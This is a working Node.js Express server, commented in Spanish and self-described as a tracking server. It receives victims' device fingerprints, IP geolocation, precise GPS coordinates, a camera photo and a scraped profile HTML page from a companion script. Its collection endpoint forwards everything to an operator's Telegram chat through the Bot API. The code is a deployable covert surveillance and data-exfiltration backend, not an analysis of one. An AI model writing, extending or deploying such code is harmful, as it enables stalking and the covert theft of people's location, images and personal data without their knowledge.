const express = require('express');
const cors = require('cors');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');

// ============================================================
// CONFIGURACIÓN DESDE VARIABLES DE ENTORNO (Railway)
// ============================================================
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const PORT = process.env.PORT || 3000;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('❌ Faltan variables: TELEGRAM_BOT_TOKEN y TELEGRAM_CHAT_ID');
    process.exit(1);
}

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 5 * 1024 * 1024 } });

// ============================================================
// ENDPOINT PARA RECIBIR DATOS DEL FRONTEND
// ============================================================
app.post('/api/collect', upload.single('photo'), async (req, res) => {
    try {
        const { deviceInfo, location, gps, profileHTML } = req.body;
        const photo = req.file;

        console.log(`📱 Datos recibidos: ${new Date().toISOString()}`);

        // 1. Mensaje de texto
        let text = `🕵️ *Nuevo rastreo*\n\n`;
        const info = JSON.parse(deviceInfo || '{}');
        const loc = JSON.parse(location || '{}');
        const gpsData = JSON.parse(gps || 'null');

        text += `📱 *Dispositivo*:\n`;
        text += `   - User-Agent: ${info.userAgent || 'N/A'}\n`;
        text += `   - Plataforma: ${info.platform || 'N/A'}\n`;
        text += `   - Idioma: ${info.language || 'N/A'}\n`;
        text += `   - Resolución: ${info.screenResolution || 'N/A'}\n`;
        text += `   - Zona horaria: ${info.timezone || 'N/A'}\n`;
        text += `   - Núcleos: ${info.cpuCores || 'N/A'}\n`;
        text += `   - Memoria: ${info.deviceMemory || 'N/A'} GB\n`;
        text += `   - Vendor: ${info.vendor || 'N/A'}\n\n`;

        if (loc.ip) {
            text += `🌐 *Ubicación (IP)*:\n`;
            text += `   - IP: ${loc.ip || 'N/A'}\n`;
            text += `   - País: ${loc.country_name || loc.country || 'N/A'}\n`;
            text += `   - Región: ${loc.region || loc.region_name || 'N/A'}\n`;
            text += `   - Ciudad: ${loc.city || 'N/A'}\n`;
            text += `   - ISP: ${loc.org || loc.isp || 'N/A'}\n\n`;
        }

        if (gpsData) {
            text += `📍 *GPS*:\n`;
            text += `   - Latitud: ${gpsData.lat}\n`;
            text += `   - Longitud: ${gpsData.lon}\n`;
            text += `   - Precisión: ${gpsData.accuracy} m\n`;
            text += `   - Maps: https://www.google.com/maps?q=${gpsData.lat},${gpsData.lon}\n\n`;
        }

        // 2. Enviar texto a Telegram
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
        });

        // 3. Enviar foto si existe
        if (photo) {
            const fd = new FormData();
            fd.append('chat_id', TELEGRAM_CHAT_ID);
            fd.append('photo', photo.buffer, { filename: 'photo.jpg', contentType: photo.mimetype });
            fd.append('caption', '📸 Foto capturada por la cámara');
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, fd, {
                headers: fd.getHeaders(),
            });
        }

        // 4. Enviar HTML si existe
        if (profileHTML) {
            const fd = new FormData();
            fd.append('chat_id', TELEGRAM_CHAT_ID);
            fd.append('document', Buffer.from(profileHTML), { filename: `perfil_${Date.now()}.html`, contentType: 'text/html' });
            fd.append('caption', '📄 Perfil completo en HTML');
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, fd, {
                headers: fd.getHeaders(),
            });
        }

        res.json({ ok: true, message: 'Datos enviados a Telegram' });
    } catch (error) {
        console.error('❌ Error:', error.message);
        res.status(500).json({ ok: false, error: error.message });
    }
});

// Servir script.js si se pide
app.get('/script.js', (req, res) => {
    res.sendFile(__dirname + '/script.js');
});

app.get('/', (req, res) => {
    res.send('✅ Servidor de rastreo funcionando');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Servidor corriendo en puerto ${PORT}`);
});